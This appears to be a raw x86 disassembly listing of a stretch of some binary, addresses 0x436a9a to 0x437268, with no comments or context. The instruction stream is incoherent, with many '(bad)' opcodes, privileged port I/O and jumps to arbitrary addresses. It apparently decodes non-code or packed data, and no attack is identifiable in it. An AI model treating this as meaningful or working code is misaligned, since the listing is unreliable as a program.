  436a9a:	fld    st(0)
  436a9c:	pop    ebp
  436a9d:	(bad)  
  436a9e:	inc    ecx
  436a9f:	call   0xc800:0x44d834ec
  436aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436aa7:	ds and al,0x7b
  436aaa:	hlt    
  436aab:	mov    ecx,0x1bccf017
  436ab0:	icebp  
  436ab1:	jg     0x436a65
  436ab3:	test   eax,0xd3bc22a4
  436ab9:	call   0x495c:0x293bcfdd
  436ac0:	loope  0x436acb
  436ac2:	inc    edx
  436ac3:	gs mov ebp,0x69cfdd9
  436ac9:	pushf  
  436aca:	push   ss
  436acb:	clc    
  436acc:	dec    esi
  436acd:	mov    esi,0xa3beab29
  436ad2:	jno    0x436ad1
  436ad4:	nop
  436ad5:	ins    BYTE PTR es:[edi],dx
  436ad6:	es xchg ecx,eax
  436ad8:	ja     0x436ada
  436ada:	loope  0x436ae5
  436adc:	pusha  
  436add:	and    DWORD PTR [edx-0x56349189],edx
  436ae3:	into   
  436ae4:	cmp    ch,bl
  436ae6:	pusha  
  436ae7:	push   ss
  436ae8:	mov    edx,0x3804ed1b
  436aed:	xchg   ebx,eax
  436aee:	scas   al,BYTE PTR es:[edi]
  436aef:	jnp    0x436b13
  436af1:	(bad)  
  436af3:	xchg   ebx,eax
  436af4:	sub    eax,0x6fbf6530
  436af9:	enter  0xf98,0x16
  436afd:	jae    0x436af9
  436aff:	sti    
  436b00:	int    0xe8
  436b02:	imul   ecx,DWORD PTR [esi+0x69],0xffffff9d
  436b06:	cli    
  436b07:	repnz xchg esp,eax
  436b09:	pop    esp
  436b0a:	and    BYTE PTR [ebx],dl
  436b0c:	lahf   
  436b0d:	add    dh,BYTE PTR [ecx]
  436b0f:	neg    DWORD PTR ds:0xed007f39
  436b15:	add    eax,0x879c0b5f
  436b1a:	clc    
  436b1b:	xor    ebp,DWORD PTR [eax]
  436b1d:	out    0xca,al
  436b1f:	mov    bl,0x9b
  436b22:	jle    0x436b4f
  436b24:	ds pop es
  436b26:	into   
  436b27:	lea    esp,[edi-0x52ce6c62]
  436b2d:	sub    edx,ebp
  436b2f:	and    al,0xe6
  436b31:	dec    ecx
  436b32:	dec    ecx
  436b33:	ja     0x436b19
  436b35:	cmp    al,BYTE PTR ds:0xac38ad80
  436b3b:	stos   BYTE PTR es:[edi],al
  436b3c:	fs sbb al,0x3f
  436b3f:	(bad)  
  436b40:	sbb    BYTE PTR [eax+0x505af842],al
  436b46:	stc    
  436b47:	rcl    DWORD PTR [edi-0x78ec03b0],0x36
  436b4e:	pop    eax
  436b4f:	cdq    
  436b50:	pushf  
  436b51:	cmp    esp,DWORD PTR [ecx+0x25]
  436b54:	sbb    edi,DWORD PTR [ebx]
  436b56:	jb     0x436bc0
  436b58:	sub    BYTE PTR [esi+0x27290802],ah
  436b5e:	sahf   
  436b5f:	lds    ebp,FWORD PTR [esi-0x2bba7dd9]
  436b65:	mov    esi,edi
  436b67:	scas   eax,DWORD PTR es:[edi]
  436b68:	retf   0x7814
  436b6b:	or     BYTE PTR [edi+0x4a],ch
  436b6e:	rcl    DWORD PTR [ecx+0x5f],cl
  436b71:	adc    bh,BYTE PTR [esi+0xff247]
  436b77:	xor    BYTE PTR [ecx-0xc],dl
  436b7a:	add    eax,0x68322136
  436b7f:	adc    eax,0xa8ab5efd
  436b84:	fsubr  DWORD PTR [ebx]
  436b86:	adc    eax,0xc8efda9d
  436b8b:	ficom  WORD PTR ss:[ebx-0x6dfbec8f]
  436b92:	pushf  
  436b93:	in     al,0x48
  436b95:	push   ecx
  436b96:	shl    BYTE PTR [edi],0x78
  436b99:	jo     0x436bd4
  436b9b:	mov    eax,ds:0x15257441
  436ba0:	in     al,0xac
  436ba2:	pushf  
  436ba3:	cmp    al,0x24
  436ba5:	pop    ecx
  436ba6:	in     eax,dx
  436ba7:	(bad)  
  436ba9:	sbb    cl,BYTE PTR [edi-0x5e4c60a6]
  436baf:	test   BYTE PTR [ebp+0x47],0xb1
  436bb3:	out    dx,eax
  436bb4:	jmp    0x436c19
  436bb6:	mov    eax,ds:0xfa46f9e0
  436bbb:	out    0xb8,al
  436bbd:	js     0x436baf
  436bbf:	or     ah,ah
  436bc1:	and    al,0x10
  436bc3:	rol    DWORD PTR [eax],0x48
  436bc6:	add    al,0x84
  436bc8:	jbe    0x436c1a
  436bca:	into   
  436bcb:	in     al,0xeb
  436bcd:	xchg   ebp,eax
  436bce:	mov    ecx,0xf216d0d7
  436bd3:	mov    al,BYTE PTR [ecx+ebp*8-0x67]
  436bd7:	adc    al,0x9
  436bd9:	mov    ecx,0xf1c26328
  436bde:	mov    esp,0xe7301352
  436be3:	pop    ebx
  436be4:	(bad)  
  436be5:	out    0x0,eax
  436be7:	fnsave [esi]
  436be9:	ror    BYTE PTR [ecx+eax*1-0x4aefd4c7],0x12
  436bf1:	out    0xd,eax
  436bf3:	adc    eax,0xc14c4974
  436bf8:	xchg   ecx,eax
  436bf9:	xchg   ebx,eax
  436bfa:	fidivr WORD PTR [edi+0x38]
  436bfd:	out    0x0,al
  436bff:	or     al,0x38
  436c01:	xchg   ebp,eax
  436c02:	outs   dx,BYTE PTR ds:[esi]
  436c03:	rcr    BYTE PTR [edi*1-0x59beb8df],cl
  436c0a:	gs (bad) 
  436c0c:	sub    cl,BYTE PTR [ebx]
  436c0e:	and    edi,esp
  436c10:	xor    BYTE PTR [ebp+ebp*8-0x7c],al
  436c14:	mov    esp,0x50145215
  436c19:	data16 fadd st,st(6)
  436c1c:	shl    DWORD PTR [ecx+0x4f],cl
  436c1f:	pop    edx
  436c20:	ins    BYTE PTR es:[edi],dx
  436c21:	aam    0xbc
  436c23:	push   ebx
  436c24:	sub    al,0x48
  436c26:	repnz push cs
  436c28:	repnz call 0xc268:0x37d16b7e
  436c30:	shl    DWORD PTR [eax],1
  436c32:	lock fist WORD PTR [eax-0x7f256747]
  436c39:	leave  
  436c3a:	cwde   
  436c3b:	inc    edx
  436c3c:	jl     0x436c1d
  436c3e:	xchg   edx,eax
  436c3f:	jns    0x436c4c
  436c41:	inc    eax
  436c42:	sahf   
  436c43:	push   edx
  436c44:	jb     0x436c71
  436c46:	daa    
  436c47:	(bad)  
  436c48:	in     al,0xb4
  436c4a:	dec    edx
  436c4b:	xor    ch,bl
  436c4d:	mov    bh,0xb2
  436c4f:	out    0x13,eax
  436c51:	xor    ah,BYTE PTR [esi]
  436c53:	adc    eax,0xc8d63abc
  436c58:	adc    ecx,ebx
  436c5a:	(bad)
  436c5e:	sub    eax,DWORD PTR [ecx+0x20761434]
  436c64:	mov    ah,0x3e
  436c66:	xor    al,0x1f
  436c68:	cmp    BYTE PTR [eax],0x79
  436c6b:	ret    0x400f
  436c6e:	xor    al,bl
  436c70:	xchg   edi,eax
  436c71:	mov    eax,ds:0xbd8bcb17
  436c76:	and    cl,ah
  436c78:	rcr    BYTE PTR [eax],1
  436c7a:	scas   eax,DWORD PTR es:[edi]
  436c7b:	enter  0x911,0xec
  436c7f:	cld    
  436c80:	push   ebx
  436c81:	xor    dl,dh
  436c83:	pop    ds
  436c84:	xchg   ebx,eax
  436c85:	dec    ecx
  436c86:	jb     0x436c66
  436c88:	or     al,BYTE PTR [edi]
  436c8a:	and    cl,bh
  436c8c:	out    0x87,al
  436c8e:	adc    BYTE PTR [eax],bh
  436c90:	adc    DWORD PTR [edx],esp
  436c92:	dec    esi
  436c93:	jb     0x436c55
  436c95:	push   0xcbf58750
  436c9a:	in     ax,0xcb
  436c9d:	jb     0x436c40
  436c9f:	push   ds
  436ca0:	inc    edx
  436ca1:	sar    al,cl
  436ca3:	hlt    
  436ca4:	xor    BYTE PTR [ecx-0x60],al
  436ca7:	sbb    ch,BYTE PTR [edi]
  436ca9:	fwait
  436caa:	xchg   DWORD PTR ds:0x4e659b35,esi
  436cb0:	shl    BYTE PTR [esi+0x19],0x55
  436cb4:	test   DWORD PTR [ebx-0x7d],eax
  436cb7:	aam    0x42
  436cb9:	sbb    al,0x4a
  436cbb:	pusha  
  436cbc:	in     eax,dx
  436cbd:	cdq    
  436cbe:	xor    al,0xc0
  436cc0:	and    al,ah
  436cc2:	and    al,0xd3
  436cc4:	and    al,0x34
  436cc6:	enter  0xf1fc,0xc4
  436cca:	xor    eax,DWORD PTR [ecx+0x3c]
  436ccd:	mov    eax,ds:0x86c5ef32
  436cd2:	dec    esp
  436cd3:	iret   
  436cd4:	sbb    eax,0x2253bdd1
  436cd9:	(bad)  
  436cda:	ss iret 
  436cdc:	leave  
  436cdd:	stos   BYTE PTR es:[edi],al
  436cde:	xor    eax,0x25c94830
  436ce3:	test   al,0xd6
  436ce5:	fs sti 
  436ce7:	xchg   esp,eax
  436ce8:	xchg   ebx,eax
  436ce9:	add    BYTE PTR [ebx],bl
  436ceb:	sbb    al,0x69
  436ced:	fisub  DWORD PTR [ebx+esi*1]
  436cf0:	or     eax,0x31665901
  436cf5:	jbe    0x436cc0
  436cf7:	lock pop eax
  436cf9:	mov    ah,0x17
  436cfb:	(bad)  
  436cfc:	clc    
  436cfd:	repz mov cl,0x90
  436d00:	cmp    ah,ah
  436d02:	in     al,dx
  436d03:	sub    DWORD PTR [ecx+ebp*8],edi
  436d06:	jmp    0x92b2fe04
  436d0b:	in     eax,0x8
  436d0d:	jg     0x436d0c
  436d0f:	or     eax,0x50813859
  436d14:	inc    esp
  436d15:	rcr    BYTE PTR [edi],cl
  436d17:	xchg   ecx,eax
  436d18:	inc    ebx
  436d19:	jnp    0x436d63
  436d1b:	jne    0x436d09
  436d1d:	push   esi
  436d1e:	loopne 0x436ce5
  436d20:	or     BYTE PTR [ebp+0x59e72db],dl
  436d26:	fidiv  WORD PTR [edx+0x36]
  436d29:	jae    0x436ce5
  436d2b:	neg    DWORD PTR ds:0x64272932
  436d31:	lods   al,BYTE PTR ds:[esi]
  436d32:	xchg   DWORD PTR [edx+0x63],esp
  436d35:	add    bh,cl
  436d37:	std    
  436d38:	data16 mov ah,0x21
  436d3b:	test   eax,0x8b13df7
  436d40:	pop    ds
  436d41:	xchg   ebp,eax
  436d42:	std    
  436d43:	and    ch,BYTE PTR [eax-0x77507b81]
  436d49:	pop    ebp
  436d4a:	jae    0x436d9e
  436d4c:	in     eax,0x6a
  436d4e:	and    ecx,DWORD PTR [ebp+esi*1-0x1d389257]
  436d55:	mov    edx,0xea5832ab
  436d5a:	pop    esp
  436d5b:	int3   
  436d5c:	loope  0x436db5
  436d5e:	gs loope 0x436d3f
  436d61:	and    dl,BYTE PTR [edi+0x129082d7]
  436d67:	jne    0x436d87
  436d69:	sub    BYTE PTR ds:0x5a27998,ch
  436d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436d70:	out    dx,al
  436d71:	fimul  WORD PTR [ebp-0x33bf0d0b]
  436d77:	add    eax,0xb59c2400
  436d7c:	fdivr  DWORD PTR [ecx-0x6f5f05ec]
  436d82:	imul   esp,DWORD PTR [ebx-0x74],0x1d
  436d86:	mov    ?,WORD PTR [ebx]
  436d88:	call   0xb1adf661
  436d8d:	xchg   esi,eax
  436d8e:	and    DWORD PTR [ebp+0x27003781],ecx
  436d94:	pop    esp
  436d95:	into   
  436d96:	xchg   BYTE PTR ds:0x9e6314cb,cl
  436d9c:	(bad)  
  436d9d:	aas    
  436d9e:	es and esp,esi
  436da1:	adc    eax,DWORD PTR [eax-0x64]
  436da4:	fdiv   st(1),st
  436da6:	inc    esi
  436da7:	fidiv  DWORD PTR [ecx]
  436da9:	ins    DWORD PTR es:[edi],dx
  436daa:	xchg   esi,eax
  436dab:	in     al,dx
  436dac:	rol    DWORD PTR [edx],cl
  436dae:	mov    cl,0x48
  436db0:	mul    BYTE PTR [ecx+eiz*8]
  436db3:	imul   ebx,DWORD PTR [edi+eiz*8-0x4bde891],0x3a
  436dbb:	sbb    BYTE PTR [edx-0x5c],bh
  436dbe:	mov    WORD PTR [ebx],?
  436dc0:	data16 add bh,BYTE PTR [esi-0x7f]
  436dc4:	scas   al,BYTE PTR es:[edi]
  436dc5:	in     al,dx
  436dc6:	stc    
  436dc7:	inc    esp
  436dc8:	dec    esp
  436dc9:	fcom   DWORD PTR [edi]
  436dcb:	rcl    cl,0xc9
  436dce:	sub    ah,bl
  436dd0:	into   
  436dd1:	fidiv  DWORD PTR [esi+0x5f32d8de]
  436dd7:	jp     0x436e30
  436dd9:	inc    ebp
  436dda:	(bad)  
  436ddd:	(bad)  
  436ddf:	std    
  436de0:	das    
  436de1:	and    DWORD PTR [edx+0x7dd59318],ecx
  436de7:	and    al,0x8
  436de9:	jmp    0xd8e6:0x9c11e41f
  436df0:	push   ecx
  436df1:	inc    eax
  436df2:	push   esi
  436df3:	dec    ecx
  436df4:	ffreep st(4)
  436df6:	out    0x86,al
  436df8:	xchg   ebx,eax
  436df9:	push   ds
  436dfa:	(bad)  
  436dfb:	sbb    ebp,DWORD PTR [edx+0x55980032]
  436e01:	sbb    eax,0x8b684b24
  436e06:	test   DWORD PTR [esi],eax
  436e08:	push   ecx
  436e09:	sub    BYTE PTR [esi],bl
  436e0b:	int    0x2e
  436e0d:	stc    
  436e0e:	push   esp
  436e0f:	and    al,0x72
  436e11:	icebp  
  436e12:	test   al,0xcc
  436e14:	mov    ds:0x2b801d4a,al
  436e19:	mov    cl,0x49
  436e1b:	enter  0x1ea3,0x97
  436e1f:	jae    0x436e2b
  436e21:	jo     0x436e83
  436e23:	in     eax,0x7c
  436e25:	in     al,dx
  436e26:	cmp    eax,0xf603de72
  436e2b:	push   ds
  436e2c:	cwde   
  436e2d:	imul   esp,DWORD PTR [eax-0x3d31cf37],0xd64d788b
  436e37:	push   edx
  436e38:	dec    eax
  436e39:	add    eax,0x3c764d06
  436e3e:	(bad)  
  436e3f:	jg     0x436e8a
  436e41:	imul   esp,DWORD PTR ds:0xf760cb27,0x11511241
  436e4c:	jge    0x436e0b
  436e4e:	adc    edi,ecx
  436e50:	cmp    ecx,0x66
  436e53:	xor    dl,BYTE PTR [esi]
  436e55:	div    DWORD PTR [eax-0x44]
  436e58:	ja     0x436ea6
  436e5a:	cs dec edx
  436e5c:	add    DWORD PTR [eax+edi*8+0x6c429921],ebp
  436e63:	and    eax,0xe13281c6
  436e68:	adc    BYTE PTR [ebx-0xbc936d2],al
  436e6e:	test   al,0x4c
  436e70:	adc    eax,DWORD PTR [esi+0x3c]
  436e73:	mov    edx,0x184eda27
  436e78:	xchg   ebp,eax
  436e79:	push   ebx
  436e7a:	mov    bh,BYTE PTR [edx+0x11]
  436e7d:	test   eax,0xbdd01f7f
  436e82:	rcr    DWORD PTR [esi],cl
  436e84:	fistp  DWORD PTR [edx]
  436e86:	xchg   ebx,eax
  436e87:	test   BYTE PTR [edx+eiz*8+0x481f47cf],dl
  436e8e:	mov    edx,0x28398901
  436e93:	sti    
  436e94:	mov    WORD PTR [esi+0x2084f7c5],cs
  436e9a:	(bad)  
  436e9b:	in     eax,0xac
  436e9d:	inc    ecx
  436e9e:	sbb    al,0x7c
  436ea0:	ins    BYTE PTR es:[edi],dx
  436ea1:	inc    esi
  436ea2:	fsubr  DWORD PTR [edi+0x70]
  436ea5:	mov    ah,0x2e
  436ea7:	(bad)  
  436eaa:	(bad)  
  436eab:	aaa    
  436eac:	arpl   WORD PTR [edi+eiz*2+0x3d271364],cx
  436eb3:	out    0x88,eax
  436eb5:	pop    esp
  436eb6:	ins    BYTE PTR es:[edi],dx
  436eb7:	test   esp,eax
  436eb9:	mov    bl,0x19
  436ebb:	cmp    DWORD PTR [esp+ecx*4-0x61],ebx
  436ebf:	sub    bh,dh
  436ec1:	jg     0x436ee3
  436ec3:	int3   
  436ec4:	push   es
  436ec5:	fs in  al,0x29
  436ec8:	push   cs
  436ec9:	imul   ebx,DWORD PTR [eax],0x4e4f688c
  436ecf:	stos   BYTE PTR es:[edi],al
  436ed0:	rcr    DWORD PTR [edx],0x24
  436ed3:	xchg   ebx,eax
  436ed4:	adc    DWORD PTR [esp],esp
  436ed7:	mov    cs,WORD PTR [eax+0x34]
  436eda:	addr16 loopne 0x436ea1
  436edd:	push   ebx
  436ede:	jb     0x436f31
  436ee0:	adc    esi,esi
  436ee2:	push   cs
  436ee3:	lds    edx,FWORD PTR [ebp+0x71]
  436ee6:	push   edx
  436ee7:	or     BYTE PTR [esi],0xcd
  436eea:	mov    ebp,DWORD PTR [esi+0x66612da2]
  436ef0:	ret    
  436ef1:	inc    edx
  436ef2:	int3   
  436ef3:	jp     0x436f57
  436ef5:	popf   
  436ef6:	xor    DWORD PTR [esi+0x64],0xffffffaf
  436efa:	sbb    dl,0x44
  436efd:	adc    ecx,esp
  436eff:	(bad)  
  436f00:	adc    eax,0xdad131a1
  436f05:	mul    BYTE PTR [edx-0x17]
  436f08:	test   eax,0xf1fdae8e
  436f0d:	cmp    esi,DWORD PTR [ebx-0x9]
  436f10:	jecxz  0x436ef3
  436f12:	aam    0xb5
  436f14:	xchg   DWORD PTR [eax+0x7c300f01],esi
  436f1a:	(bad)  
  436f1b:	imul   edx,DWORD PTR [eax],0x36aac82f
  436f21:	cwde   
  436f22:	gs and al,0x24
  436f25:	mov    esp,0xfb12c0ea
  436f2a:	arpl   WORD PTR [eax-0x52],dx
  436f2d:	inc    ebp
  436f2e:	xchg   DWORD PTR [edx],edi
  436f30:	jecxz  0x436f65
  436f32:	xor    dh,BYTE PTR [ebx-0x5a1defe8]
  436f38:	test   al,dh
  436f3a:	pusha  
  436f3b:	inc    ebx
  436f3c:	in     eax,0x14
  436f3e:	es scas eax,DWORD PTR es:[edi]
  436f40:	and    BYTE PTR [ebp-0x32],ch
  436f43:	pop    es
  436f44:	gs dec eax
  436f46:	outs   dx,BYTE PTR ds:[esi]
  436f47:	push   ds
  436f48:	xor    ecx,esi
  436f4a:	mov    eax,DWORD PTR [edi+0x70ef8f5c]
  436f50:	in     al,dx
  436f51:	sbb    eax,0x1fdaf392
  436f56:	mov    eax,DWORD PTR [ebp-0x7abc193f]
  436f5c:	dec    esi
  436f5d:	add    esi,esp
  436f5f:	pop    edx
  436f60:	mov    dh,0x9
  436f62:	test   al,0x27
  436f64:	(bad)  
  436f65:	cli    
  436f66:	add    al,0xfc
  436f68:	adc    ch,BYTE PTR [edi+0x30]
  436f6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436f6c:	add    eax,0xeb3c4368
  436f71:	dec    esp
  436f72:	bound  eax,QWORD PTR [ebx-0x4a]
  436f75:	mov    eax,0x91ddc471
  436f7a:	ins    DWORD PTR es:[edi],dx
  436f7b:	dec    esi
  436f7c:	push   0x4fa1c8d4
  436f81:	or     esi,DWORD PTR [edi]
  436f83:	or     esp,eax
  436f85:	in     al,0x83
  436f87:	js     0x436fdb
  436f89:	xor    WORD PTR [esi-0x75],bx
  436f8d:	test   BYTE PTR [edx+0x4b58a743],0x3a
  436f94:	in     eax,dx
  436f95:	pop    ds
  436f96:	(bad)  
  436f97:	jno    0x436fe1
  436f99:	fistp  QWORD PTR [edi+0x28]
  436f9c:	ss adc eax,0xb7b465de
  436fa2:	or     DWORD PTR [ecx+0x70],ebx
  436fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436fa6:	dec    DWORD PTR [edi+0x1bb528c8]
  436fac:	mov    cl,0x49
  436fae:	dec    ecx
  436faf:	cwde   
  436fb0:	add    dh,BYTE PTR [ebp+eax*1-0x315ed355]
  436fb7:	mov    ds:0xe0495e31,eax
  436fbc:	mov    ebp,es
  436fbe:	jge    0x436fec
  436fc0:	ficom  WORD PTR [ebx]
  436fc2:	icebp  
  436fc3:	jge    0x436fdf
  436fc5:	mov    edi,0x5d4393df
  436fca:	aaa    
  436fcb:	arpl   WORD PTR [ebx+ebx*1-0x7846151b],bp
  436fd2:	arpl   WORD PTR [eax+ecx*2],cx
  436fd5:	test   eax,0xa2b597ee
  436fda:	std    
  436fdb:	mov    eax,0xa4064d77
  436fe0:	jno    0x436f74
  436fe2:	push   ebx
  436fe3:	xchg   BYTE PTR ds:0x30f60e1f,bl
  436fe9:	ret    0x1a
  436fec:	push   edx
  436fed:	adc    dl,BYTE PTR [edx]
  436fef:	pop    ss
  436ff0:	gs sub eax,0x2410288b
  436ff6:	es int3 
  436ff8:	loope  0x43700f
  436ffa:	fyl2x  
  436ffc:	mov    BYTE PTR [esi],0xa6
  436fff:	int3   
  437000:	fstp   DWORD PTR [esp+ebp*4-0x638b7fa7]
  437007:	rol    BYTE PTR [ecx+0xd],1
  43700a:	adc    al,0x7c
  43700c:	or     BYTE PTR [eax+0x66],dh
  43700f:	cld    
  437010:	push   cs
  437011:	add    BYTE PTR [ebx+0x4581b270],cl
  437017:	mov    ecx,0x86b8572e
  43701c:	sbb    al,0x87
  43701e:	push   ebx
  43701f:	fwait
  437020:	aam    0x7a
  437022:	mov    ah,0x20
  437024:	xchg   edx,eax
  437025:	xchg   ebx,eax
  437026:	adc    BYTE PTR [esi],bh
  437028:	loopne 0x437046
  43702a:	jo     0x436fe4
  43702c:	mov    bl,0xa6
  43702e:	leave  
  43702f:	ins    DWORD PTR es:[edi],dx
  437030:	popa   
  437031:	mov    ?,WORD PTR [ebx]
  437033:	or     BYTE PTR gs:[edx],dh
  437036:	sub    ah,BYTE PTR fs:[eax+edi*8+0x22]
  43703b:	lods   al,BYTE PTR ds:[esi]
  43703c:	repz sbb al,0x97
  43703f:	mov    cl,0x96
  437041:	mov    dh,0x5f
  437043:	sub    al,0x9d
  437045:	out    dx,al
  437046:	sbb    ebx,ecx
  437048:	test   eax,0xbcad1a98
  43704d:	sbb    eax,0x20900e93
  437052:	out    0x37,eax
  437054:	retf   
  437055:	push   ebx
  437056:	sbb    dh,cl
  437058:	lods   al,BYTE PTR ds:[esi]
  437059:	out    dx,eax
  43705a:	enter  0x4b5,0x8
  43705e:	rol    DWORD PTR [eax+0xe],1
  437061:	mov    dl,0x1a
  437063:	adc    edi,DWORD PTR [ebp+0x53]
  437066:	xchg   esi,eax
  437067:	hlt    
  437068:	aam    0x89
  43706a:	dec    ebx
  43706b:	out    dx,eax
  43706c:	stc    
  43706d:	mov    dh,0x58
  43706f:	dec    esp
  437070:	mov    bh,0x65
  437072:	iret   
  437073:	sub    DWORD PTR [ecx+edx*8+0x202759c3],esi
  43707a:	mov    WORD PTR [eax],es
  43707c:	int3   
  43707d:	xchg   edx,eax
  43707e:	push   ss
  43707f:	pop    edx
  437080:	outs   dx,DWORD PTR ds:[esi]
  437081:	mov    ah,0xe3
  437083:	pop    ebx
  437084:	icebp  
  437085:	mov    esp,0xaf24b273
  43708a:	mov    edi,cs
  43708c:	frstpm(287 only) 
  43708e:	fdiv   QWORD PTR [eax-0x1e]
  437091:	jmp    0x43710c
  437093:	jle    0x437089
  437095:	push   0xffffffd6
  437097:	es mov eax,0x12cb2ef4
  43709d:	pop    ds
  43709e:	push   es
  43709f:	arpl   WORD PTR [esp+ecx*2+0x6fffd9db],bx
  4370a6:	retf   0x5831
  4370a9:	mov    al,ds:0x5decf0a7
  4370ae:	xchg   edx,eax
  4370af:	shr    DWORD PTR [edx-0x57],1
  4370b2:	ins    DWORD PTR es:[edi],dx
  4370b3:	inc    edi
  4370b4:	fs push cs
  4370b6:	add    eax,0xe4379b60
  4370bb:	bound  ebx,QWORD PTR [edx+0x23bf0294]
  4370c1:	xor    ebp,DWORD PTR [edi+ebx*4]
  4370c4:	mov    ebx,?
  4370c6:	(bad)
  4370ca:	mov    al,ds:0xf4ae9cd8
  4370cf:	imul   esp,DWORD PTR [edx],0x21e690da
  4370d5:	or     ebp,esp
  4370d7:	shufps xmm6,xmm7,0x87
  4370db:	arpl   cx,ax
  4370dd:	xchg   ebp,eax
  4370de:	fs pop esi
  4370e0:	ds mov eax,0x21c90eec
  4370e6:	fidiv  WORD PTR [esi-0x27]
  4370e9:	cmp    DWORD PTR [esi],eax
  4370eb:	je     0x437102
  4370ed:	pop    edi
  4370ee:	into   
  4370ef:	sbb    eax,0x508a7c39
  4370f4:	and    eax,0x6b23378c
  4370f9:	jg     0x437164
  4370fb:	ins    BYTE PTR es:[edi],dx
  4370fc:	adc    cl,BYTE PTR [eax-0x10f896d9]
  437102:	xchg   esp,eax
  437103:	mov    bl,0xd2
  437105:	(bad)  
  437106:	xor    dh,ah
  437108:	scas   eax,DWORD PTR es:[edi]
  437109:	dec    edi
  43710a:	inc    esi
  43710b:	fsubr  DWORD PTR [ecx]
  43710d:	out    0x8f,al
  43710f:	jl     0x437116
  437111:	ss xor al,0x39
  437114:	repz xchg esp,eax
  437116:	mov    bl,0x42
  437118:	imul   eax,ebx,0xffffffeb
  43711b:	int    0x29
  43711d:	dec    edx
  43711e:	push   0xb26e5498
  437123:	sbb    eax,0xcf480bc9
  437128:	jge    0x437166
  43712a:	out    dx,al
  43712b:	sar    edi,0x41
  43712e:	cld    
  43712f:	push   ds
  437130:	rcl    DWORD PTR [esi],cl
  437132:	xor    eax,0x126c42fd
  437137:	push   0x57
  437139:	jb     0x437195
  43713b:	adc    ah,BYTE PTR [ebp+0x7592a322]
  437141:	push   cs
  437142:	sbb    BYTE PTR gs:[edx],bl
  437145:	fcomp  QWORD PTR [edx-0xfbcf14]
  43714b:	inc    eax
  43714c:	in     al,0xe8
  43714e:	(bad)  
  43714f:	hlt    
  437150:	adc    ebp,DWORD PTR [edx]
  437152:	jb     0x437108
  437154:	xor    eax,eax
  437156:	pop    ecx
  437157:	mov    ah,0x83
  437159:	push   eax
  43715a:	cs inc edx
  43715c:	xchg   esi,eax
  43715d:	and    al,0x26
  43715f:	mov    BYTE PTR [esi],bh
  437161:	pusha  
  437162:	push   ebx
  437163:	(bad)  
  437164:	dec    esp
  437165:	shl    bh,0x0
  437168:	int    0x1d
  43716a:	add    BYTE PTR [ecx],bh
  43716c:	leave  
  43716d:	sub    ch,bl
  43716f:	xor    al,0x86
  437171:	arpl   WORD PTR [edx],si
  437173:	or     BYTE PTR [edx+esi*4-0x2d],0x11
  437178:	sbb    al,0x6
  43717a:	fimul  DWORD PTR [edx-0x4f]
  43717d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43717e:	ficom  WORD PTR [ebp-0x6]
  437181:	enter  0x1fd3,0x78
  437185:	jmp    0xe242e574
  43718a:	jno    0x4371ea
  43718c:	or     al,0x7
  43718e:	aas    
  43718f:	loopne 0x4371af
  437191:	push   esp
  437192:	push   ecx
  437193:	dec    esi
  437194:	addr16 loop 0x437195
  437197:	fsub   DWORD PTR [edi+0x24]
  43719a:	test   esp,ebp
  43719c:	les    esp,FWORD PTR [eax+eiz*8+0x21]
  4371a0:	dec    ebp
  4371a1:	adc    edi,DWORD PTR [edi+0x2d]
  4371a4:	push   ss
  4371a5:	hlt    
  4371a6:	jbe    0x4371f4
  4371a8:	or     dl,BYTE PTR [ebx+ebx*2-0x28]
  4371ac:	cmp    al,0xf8
  4371ae:	add    al,0xd2
  4371b0:	mov    bl,0x1e
  4371b2:	mov    eax,0x45fba0d7
  4371b7:	ds pop ecx
  4371b9:	or     al,0x80
  4371bb:	push   edx
  4371bc:	shl    bl,cl
  4371be:	shr    ecx,cl
  4371c0:	repz mov bl,BYTE PTR [edx+esi*1+0xa]
  4371c5:	enter  0x2a23,0xd3
  4371c9:	je     0x437207
  4371cb:	mov    ecx,DWORD PTR [eax]
  4371cd:	ret    0x5ca2
  4371d0:	jb     0x43720c
  4371d2:	fld    QWORD PTR [ebx]
  4371d4:	mov    ds,WORD PTR [eax+ebp*8]
  4371d7:	jno    0x437243
  4371d9:	out    0x79,eax
  4371db:	pop    ecx
  4371dc:	mov    ds:0xc0086993,al
  4371e1:	test   BYTE PTR [eax+0x510d9306],cl
  4371e7:	out    0xe1,al
  4371e9:	ins    BYTE PTR es:[edi],dx
  4371ea:	adc    BYTE PTR [ecx+0x74],ah
  4371ed:	sub    ebx,0x19724f2e
  4371f3:	xchg   ecx,eax
  4371f4:	arpl   WORD PTR [ecx-0x562fb898],di
  4371fa:	adc    DWORD PTR [edx],ebx
  4371fc:	inc    esp
  4371fd:	push   ebx
  4371fe:	mov    edx,0x424a7d13
  437203:	push   cs
  437204:	lods   eax,DWORD PTR ds:[esi]
  437205:	stos   DWORD PTR es:[edi],eax
  437206:	inc    ebp
  437207:	data16 cmp BYTE PTR [edx-0x65],cl
  43720b:	std    
  43720c:	cwde   
  43720d:	jl     0x4371d9
  43720f:	ins    DWORD PTR es:[edi],dx
  437210:	enter  0x898,0x12
  437214:	test   DWORD PTR [eax],edi
  437216:	push   ecx
  437217:	jg     0x437258
  437219:	cli    
  43721a:	jbe    0x437274
  43721c:	dec    esi
  43721d:	and    al,0xa1
  43721f:	cmp    dl,ch
  437221:	dec    eax
  437222:	mov    dh,0x70
  437224:	jo     0x43728a
  437226:	sub    ecx,0x9a82dfc0
  43722c:	lahf   
  43722d:	test   dl,ah
  43722f:	xchg   ebx,eax
  437230:	fld    DWORD PTR [esi]
  437232:	dec    esp
  437233:	jae    0x43727d
  437235:	fidivr WORD PTR [esi]
  437237:	mov    dh,0x7c
  437239:	push   0xfffffffb
  43723b:	and    esi,DWORD PTR [ecx-0x6134d020]
  437241:	jle    0x43727b
  437243:	adc    DWORD PTR [ebx+0x1672060],edx
  437249:	dec    ebp
  43724a:	outs   dx,BYTE PTR ds:[esi]
  43724b:	and    eax,0xbe0c4dfb
  437250:	pop    ebp
  437251:	push   ss
  437252:	pop    esp
  437253:	test   al,0xbe
  437255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437256:	inc    ebx
  437257:	and    eax,DWORD PTR [eax-0x6e4ecd78]
  43725d:	cwde   
  43725e:	xor    edx,DWORD PTR [edx+0x513bf08d]
  437264:	mov    bl,0x81
  437266:	mov    ch,0x80
  437268:	lahf   
